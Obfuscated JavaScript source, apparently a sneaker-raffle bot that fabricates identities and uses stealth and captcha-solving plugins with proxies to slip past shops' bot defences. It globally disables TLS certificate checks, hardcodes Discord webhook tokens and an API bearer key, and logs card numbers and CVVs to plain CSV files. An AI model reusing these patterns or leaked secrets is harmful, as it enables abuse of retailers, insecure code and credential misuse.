process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0xdc01cc = require('node-imap'), _0x287863 = require('util')['inspect'];
const _0x31366c = require('mailparser')['simpleParser'], { EmbedBuilder: _0xfd9c0c } = require('discord.js');
var _0x1723b5 = require('exe');
const { execFile: _0x4703b2 } = require('child_process'), _0x3d68d8 = require('puppeteer-extra'), _0x2efef1 = require('puppeteer-extra-plugin-recaptcha'), _0x4dfb83 = require('puppeteer-extra-plugin-stealth'), _0x52c84d = require('chalk'), _0x2ad028 = require('node-bash-title'), _0x4d1c4a = require('fs'), _0x3c2e57 = require('axios'), _0x203056 = require('papaparse');
var _0x22cd66 = require('random-name');
const _0x247acd = require('request');
var _0x540112 = require('prompt');
const _0xe4a440 = _0x247acd['jar']();
var _0x5e160d = {};
const _0x4c9f93 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x58c54a = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0xe63349 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x5b3512 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x266614 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x2f4fc2 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x212756 = 'https://discord.com/api/webhooks/', _0x41520b = '' + _0x212756 + _0xe63349, _0x244950 = '' + _0x212756 + _0x5b3512, _0x4f82a9 = '' + _0x212756 + _0x4c9f93, _0x233d0f = '' + _0x212756 + _0x58c54a, _0x2766d4 = '' + _0x212756 + _0x266614, _0x296457 = '' + _0x212756 + _0x2f4fc2;
const _0x4f1e4f = JSON['parse'](_0x4d1c4a['readFileSync']('../package.json', 'utf-8')), _0xa56f6b = _0x4f1e4f['version'];
var _0x4d0da0, _0x63ed92, _0x27eddd, _0x2f1920, _0x2e8356, _0x1b8b03, _0x50a338, _0x36bd87;
const _0x5164bc = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x2db043 = ![];
const _0x13013a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x5ef779 = '0123456789';
var _0x5394db = _0x13013a['split']('');
const _0x360c5b = require('auto-git-update'), { PageEmittedEvents: _0x23e62c } = require('puppeteer'), { getRandomValues: _0x42daa1 } = require('crypto'), { resolve: _0x35e778 } = require('path'), { Console: _0x299765 } = require('console'), _0xde0fbb = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x4cb102 = new _0x360c5b(_0xde0fbb);
async function _0x27d995() {
    _0x2e8356 = _0x4d1c4a['readdirSync']('../proxies'), _0x2f1920 = _0x4d1c4a['readdirSync']('../tasks'), !_0x4d1c4a['existsSync']('../accounts/fenom.csv') && _0x4d1c4a['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x4d1c4a['existsSync']('../accounts/bstn.csv') && _0x4d1c4a['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x4d1c4a['existsSync']('../failed-tasks.csv') && _0x4d1c4a['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x4d1c4a['existsSync']('../successful-tasks.csv') && _0x4d1c4a['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x5e160d = JSON['parse'](_0x4d1c4a['readFileSync']('../settings.json', 'utf-8')), !_0x5e160d['delay'] && (_0x5e160d['delay'] = 0x3c, _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d, null, 0x2))), !_0x5e160d['masterMail'] && (_0x5e160d['masterMail'] = 'yourmail@gmail.com', _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d, null, 0x2))), !_0x5e160d['masterPassword'] && (_0x5e160d['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d, null, 0x2))), !_0x5e160d['captchaKey'] && (_0x5e160d['captchaKey'] = '', _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d, null, 0x2))), !_0x5e160d['useRandomProxy'] && (_0x5e160d['useRandomProxy'] = !![], _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d, null, 0x2))), !_0x5e160d['shuffleTasks'] && (_0x5e160d['useRandomProxy'] = ![], _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d, null, 0x2))), !_0x5e160d['webhook'] && (_0x5e160d['webhook'] = '', _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d, null, 0x2))), _0x5e160d['delay'] <= 0x1388 && (_0x5e160d['delay'] = _0x5e160d['delay'] * 0x3e8), _0x5e160d['AfewDelay'] && (delete _0x5e160d['AfewDelay'], _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d, null, 0x2))), _0x5e160d['MahaDelay'] && (delete _0x5e160d['MahaDelay'], _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d, null, 0x2))), _0x5e160d['footshopDelay'] && (delete _0x5e160d['footshopDelay'], _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d, null, 0x2))), _0x5e160d['MahaDelay'] = _0x5e160d['delay'], _0x212756 = _0x5e160d['webhook'], _0x1b8b03 = _0x5e160d['licenseKey'];
}
let _0x18c79a, _0x3d716a = [], _0x57f10b;
const _0x38c39e = _0x21e76b => new Promise(_0x186e60 => setTimeout(_0x186e60, _0x21e76b));
function _0x32d290(_0x19adcb, _0x4c263a) {
    return Math['floor'](Math['random']() * (_0x4c263a - _0x19adcb + 0x1) + _0x19adcb);
}
function _0x2166d2(_0x5af6ba) {
    let _0x273409 = _0x5af6ba['length'], _0xc384fc;
    while (_0x273409 != 0x0) {
        _0xc384fc = Math['floor'](Math['random']() * _0x273409), _0x273409--, [_0x5af6ba[_0x273409], _0x5af6ba[_0xc384fc]] = [
            _0x5af6ba[_0xc384fc],
            _0x5af6ba[_0x273409]
        ];
    }
    return _0x5af6ba;
}
async function _0x53381a(_0x36c77a) {
    return _0x3c2e57['get']('https://api.hyper.co/v4/licenses/' + _0x36c77a, { 'headers': { 'Authorization': 'Bearer\x20' + _0x5164bc } })['then'](_0x1fe4ff => _0x1fe4ff['data'])['catch'](() => null);
}
;
async function _0x17eddb(_0x51cb2c) {
    console['clear']();
    if (_0x51cb2c == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x2ac31b = await _0x540112['get']('License');
        if (_0x2ac31b['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x38c39e(0xbb8), _0x17eddb(_0x51cb2c);
        _0x51cb2c = _0x2ac31b['License'], _0x5e160d['licenseKey'] = _0x51cb2c, _0x1b8b03 = _0x51cb2c, _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d));
    }
    console['log']('Checking\x20license\x20' + _0x1b8b03 + '...'), await _0x38c39e(0x320);
    const _0x4e48fe = await _0x53381a(_0x51cb2c);
    _0x50a338 = JSON['stringify'](_0x4e48fe['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x36bd87 = JSON['stringify'](_0x4e48fe['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x4e48fe)
        return console['log']('License\x20not\x20found');
    if (!_0x4e48fe['user'])
        return console['log']('License\x20not\x20bound');
    return _0x4e48fe['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x2db043 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x2db043 = ![]);
}
async function _0x2f8b95() {
    var _0x3fff9f = await _0x540112['get']('Module');
    return console['clear'](), _0x3fff9f['Module'];
}
;
async function _0x2af423() {
    var _0x459ebe = await _0x540112['get']('Setting');
    return console['clear'](), _0x459ebe['Setting'];
}
async function _0xd0c90a() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x396ec6 = 0x0; _0x396ec6 < _0x2f1920['length']; _0x396ec6++) {
        console['log']('\x20(' + _0x396ec6 + ')\x20' + _0x2f1920[_0x396ec6]);
    }
    console['log']('');
    var _0x2e3e5e = await _0x540112['get']('Task');
    if (_0x2e3e5e['Task'] > _0x2f1920['length'] - 0x1 || isNaN(_0x2e3e5e['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x38c39e(0x3e8), _0xd0c90a();
    var _0x473f70 = _0x4d1c4a['readFileSync']('../tasks/' + _0x2f1920[_0x2e3e5e['Task']], 'utf-8');
    return _0x27eddd = _0x203056['parse'](_0x473f70, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x52c84d['blue'](_0x2f1920[_0x2e3e5e['Task']])), _0x4d0da0 = _0x2f1920[_0x2e3e5e['Task']], _0x27eddd;
}
async function _0x48792d() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x2dd1c2 = 0x0; _0x2dd1c2 < _0x2e8356['length']; _0x2dd1c2++) {
        console['log']('\x20(' + _0x2dd1c2 + ')\x20' + _0x2e8356[_0x2dd1c2]);
    }
    console['log']('');
    var _0x362626 = await _0x540112['get']('Proxies');
    if (_0x362626['Proxies'] > _0x2e8356['length'] - 0x1 || isNaN(_0x362626['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x38c39e(0x3e8), _0x48792d();
    var _0x5193bd = _0x4d1c4a['readFileSync']('../proxies/' + _0x2e8356[_0x362626['Proxies']], 'utf-8')['split']('\x0a');
    let _0x2f9dfb = _0x5193bd['map']((_0x4dc156, _0x2190e4) => {
        sanatizeProxy = _0x4dc156['replace']('\x0d', '');
        if (_0x5193bd[_0x2190e4 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x63ed92 = _0x2e8356[_0x362626['Proxies']], console['clear'](), _0x2f9dfb;
}
async function _0x40b1d1() {
    var _0x3babde = await _0x540112['get']('Value');
    return console['clear'](), _0x3babde['Value'];
}
async function _0x246aa0(_0x1ba41e) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x138a4b = 0x0; _0x138a4b < _0x1ba41e['length']; _0x138a4b++) {
        console['log']('\x20(' + _0x138a4b + ')\x20[' + _0x1ba41e[_0x138a4b]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x4ccccd = await _0x540112['get']('Module');
    return _0x4ccccd['Module'];
}
async function _0x4e4e9d() {
    var _0x47e9cc = await _0x540112['get']('Password');
    return console['clear'](), _0x47e9cc['Password'];
}
;
async function _0x449cae() {
    var _0x422244 = await _0x540112['get']('Links');
    return _0x422244['Links'];
}
;
async function _0x5ac243() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x3d01e5 = 0x0; _0x3d01e5 < _0x3d716a['length']; _0x3d01e5++) {
        console['log']('\x20(' + _0x3d01e5 + ')\x20' + _0x3d716a[_0x3d01e5]);
    }
    ;
    console['log']();
    let _0x3645ff = await _0x540112['get']('Product');
    return console['clear'](), _0x3645ff['Product'];
}
;
function _0x21c871() {
    var _0x414540 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x414540;
}
;
function _0x20248a() {
    var _0x241dab = new Date(Date['now']())['toLocaleString']();
    return _0x241dab['replace'](',', '');
}
async function _0x16a920(_0x49f2f0, _0x3fac59) {
    let _0x41aa06 = { 'headers': { 'content-type': 'application/json' } };
    if (_0xa56f6b != 'devkey') {
        await _0x3c2e57['post'](_0x49f2f0, _0x3fac59, _0x41aa06);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x485032(_0x4ba8b6, _0x2a9624, _0xd507e0, _0x116b48, _0x36e8a9) {
    if (!_0x116b48 && _0xd507e0 == 'dev') {
        var _0xb289d8 = new _0xfd9c0c()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2a9624['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2a9624['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x4ba8b6['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x5e160d['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x50a338,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x4ba8b6['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0xa56f6b,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0xb289d8['data'];
    } else {
        if (_0x116b48 && _0xd507e0 == 'dev') {
            var _0xb289d8 = new _0xfd9c0c()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2a9624['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x50a338,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2a9624['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x4ba8b6['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x5e160d['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x36e8a9,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x4ba8b6['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0xa56f6b,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0xb289d8['data'];
        } else {
            if (_0xd507e0 == 'pub') {
                var _0xb289d8 = new _0xfd9c0c()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2a9624['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2a9624['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x4ba8b6['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x5e160d['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x4ba8b6['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0xa56f6b,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0xb289d8['data'];
            } else {
                if (_0xd507e0 == 'acc' && !_0x116b48) {
                    var _0xb289d8 = new _0xfd9c0c()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2a9624['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x50a338,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2a9624['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x5e160d['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0xa56f6b,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0xb289d8['data'];
                } else {
                    if (_0xd507e0 == 'acc' && _0x116b48) {
                        var _0xb289d8 = new _0xfd9c0c()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2a9624['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x50a338,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x36e8a9,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x2a9624['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x5e160d['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0xa56f6b,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0xb289d8['data'];
                    } else {
                        if (_0xd507e0 == 'open') {
                            var _0xb289d8 = new _0xfd9c0c()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x36bd87)['addFields']({
                                'name': 'User',
                                'value': '' + _0x50a338,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0xa56f6b,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0xb289d8['data'];
                        } else {
                            if (!_0x116b48 && _0xd507e0 == 'ver') {
                                var _0xb289d8 = new _0xfd9c0c()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x2a9624['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x50a338,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x2a9624['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x5e160d['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0xa56f6b,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0xb289d8['data'];
                            } else {
                                if (_0x116b48 && _0xd507e0 == 'ver') {
                                    var _0xb289d8 = new _0xfd9c0c()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x2a9624['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x50a338,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x36e8a9,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x2a9624['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x5e160d['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0xa56f6b,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0xb289d8['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x3962cc(_0x58da99, _0x4f46e1) {
    var _0x3bab72 = _0x58da99[_0x4f46e1]['Address1']['split'](''), _0x2c7537 = _0x58da99[_0x4f46e1]['Address2']['split'](''), _0x27590f = _0x58da99[_0x4f46e1]['Email']['split']('@');
    for (var _0x361422 = 0x0; _0x361422 < _0x3bab72['length']; _0x361422++) {
        if (_0x3bab72[_0x361422] == 'X') {
            var _0x11ab8b = Math['round'](Math['random']() * (_0x13013a['length'] - 0x1));
            _0x3bab72[_0x361422] = _0x5394db[_0x11ab8b];
        }
    }
    ;
    for (var _0x361422 = 0x0; _0x361422 < _0x2c7537['length']; _0x361422++) {
        if (_0x2c7537[_0x361422] == 'X') {
            var _0x11ab8b = Math['round'](Math['random']() * (_0x13013a['length'] - 0x1));
            _0x2c7537[_0x361422] = _0x5394db[_0x11ab8b];
        }
    }
    ;
    _0x58da99[_0x4f46e1]['FirstName'] == 'RANDOM' && (_0x58da99[_0x4f46e1]['FirstName'] = _0x22cd66['first']());
    _0x58da99[_0x4f46e1]['LastName'] == 'RANDOM' && (_0x58da99[_0x4f46e1]['LastName'] = _0x22cd66['last']());
    _0x27590f[0x0] == 'RANDOM' ? _0x27590f[0x0] = '' + _0x22cd66['first']() + _0x22cd66['last']() + _0x32d290(0x1, 0x270f) + '@' : _0x27590f[0x0] = _0x27590f[0x0] + '@';
    _0x58da99[_0x4f46e1]['Email'] = _0x27590f['join'](''), _0x58da99[_0x4f46e1]['Address1'] = _0x3bab72['join'](''), _0x58da99[_0x4f46e1]['Address2'] = _0x2c7537['join']('');
    _0x58da99[_0x4f46e1]['Phone'] == 'RANDOM' && (_0x58da99[_0x4f46e1]['Phone'] = '0' + _0x32d290(0x5f5e100, 0x3b9ac9ff));
    if (_0x58da99[_0x4f46e1]['Follower'] == 'RANDOM') {
        var _0x2719f3 = _0x32d290(0x1, 0x270f);
        _0x58da99[_0x4f46e1]['Follower'] = '' + _0x22cd66['first']() + _0x22cd66['last']() + _0x2719f3 + '\x20';
    }
    _0x58da99[_0x4f46e1]['HouseNumber'] == 'RANDOM' && (_0x58da99[_0x4f46e1]['HouseNumber'] = _0x32d290(0x1, 0xc8));
    if (_0x58da99[_0x4f46e1]['Address1'] == 'RANDOM') {
        var _0x471a36 = Math['round'](Math['random']() * (_0x13013a['length'] - 0x1)), _0x37fb82 = _0x5394db[_0x471a36];
        _0x58da99[_0x4f46e1]['Address1'] = _0x22cd66['last']() + 'straat', _0x58da99[_0x4f46e1]['Zip'] == '' && (_0x58da99[_0x4f46e1]['Postcode'] = _0x32d290(0x3e8, 0x270f) + '\x20' + _0x37fb82 + _0x37fb82, _0x58da99[_0x4f46e1]['Zip'] = _0x58da99[_0x4f46e1]['Postcode']), _0x58da99[_0x4f46e1]['HouseNumber'] = '' + _0x32d290(0x1, 0xc8);
    }
    return;
}
;
async function _0x1ac5d5(_0x524f82, _0x385e8d) {
    _0x4d1c4a['appendFileSync']('../failed-tasks.csv', _0x20248a() + ',' + _0x385e8d['store'] + ',' + _0x385e8d['name'] + ',' + _0x524f82['Url'] + ',' + _0x524f82['Size'] + ',' + _0x524f82['Follower'] + ',' + _0x524f82['FirstName'] + ',' + _0x524f82['LastName'] + ',' + _0x524f82['Address1'] + ',' + _0x524f82['Address2'] + ',' + _0x524f82['HouseNumber'] + ',' + _0x524f82['Zip'] + ',' + _0x524f82['City'] + ',' + _0x524f82['State'] + ',' + _0x524f82['Country'] + ',' + _0x524f82['Phone'] + ',' + _0x524f82['Email'] + ',' + _0x524f82['Password'] + ',' + _0x524f82['PaymentMethod'] + ',' + _0x524f82['CardType'] + ',' + _0x524f82['NameOnCard'] + ',' + _0x524f82['CardNumber'] + ',' + _0x524f82['ExpiryDate'] + ',' + _0x524f82['CVV'] + ',' + _0x524f82['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x41f993(_0x12a520, _0x184199) {
    _0x4d1c4a['appendFileSync']('../successful-tasks.csv', _0x20248a() + ',' + _0x184199['store'] + ',' + _0x184199['name'] + ',' + _0x12a520['Url'] + ',' + _0x12a520['Size'] + ',' + _0x12a520['Follower'] + ',' + _0x12a520['FirstName'] + ',' + _0x12a520['LastName'] + ',' + _0x12a520['Address1'] + ',' + _0x12a520['Address2'] + ',' + _0x12a520['HouseNumber'] + ',' + _0x12a520['Zip'] + ',' + _0x12a520['City'] + ',' + _0x12a520['State'] + ',' + _0x12a520['Country'] + ',' + _0x12a520['Phone'] + ',' + _0x12a520['Email'] + ',' + _0x12a520['Password'] + ',' + _0x12a520['PaymentMethod'] + ',' + _0x12a520['CardType'] + ',' + _0x12a520['NameOnCard'] + ',' + _0x12a520['CardNumber'] + ',' + _0x12a520['ExpiryDate'] + ',' + _0x12a520['CVV'] + ',' + _0x12a520['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x224b8a() {
    let _0x5e55bc = proxyFile['split']('\x0a'), _0x4c3db7 = _0x5e55bc['map']((_0x2eea2c, _0x2fae9f) => {
        sanatizeProxy = _0x2eea2c['replace']('\x0d', '');
        if (_0x5e55bc[_0x2fae9f + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4c3db7;
}
;
async function _0x257f07(_0x375084) {
    var _0x49976d = _0x375084[0x1]['split'](':');
    const _0x5a31c2 = await _0x3d68d8['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x49976d[0x0] + ':' + _0x49976d[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x4f1cea = await _0x5a31c2['newPage']();
        await _0x4f1cea['authenticate']({
            'username': '' + _0x49976d[0x2],
            'password': '' + _0x49976d[0x3]
        }), console['log'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x4f1cea['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4f1cea['setRequestInterception'](!![]), _0x4f1cea['on']('request', _0x556419 => {
            _0x556419['resourceType']() === 'image' || _0x556419['resourceType']() === 'font' || _0x556419['resourceType']() === 'media' ? _0x556419['abort']() : _0x556419['continue']();
        }), await _0x4f1cea['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x4f1cea['waitForTimeout'](0xbb8), await _0x4f1cea['waitForSelector']('.product-card');
        const _0x250091 = await _0x4f1cea['$$eval']('a.product-card', _0x2ba969 => {
            return _0x2ba969['map'](_0x3bf7a6 => _0x3bf7a6['href']);
        });
        return _0x3d716a = _0x250091;
    } catch (_0x4ecba8) {
        console['log']('\x20' + _0x4ecba8);
    } finally {
        _0x5a31c2['close'](), console['clear']();
    }
}
;
async function _0x279bb5(_0x15b339, _0x5e4287) {
    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5e160d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3a6ba2 = 0x0; _0x3a6ba2 < bouncewear['length']; _0x3a6ba2++) {
        await _0x3962cc(bouncewear, _0x3a6ba2);
        if (bouncewear[_0x3a6ba2]['Email'] == '' || bouncewear[_0x3a6ba2]['Password'] == '' || bouncewear[_0x3a6ba2]['FirstName'] == '' || bouncewear[_0x3a6ba2]['LastName'] == '') {
            console['log'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5e160d['useRandomProxy'] = ![])
            var _0x1247a8 = _0x224b8a()[_0x3a6ba2]['split'](':');
        else
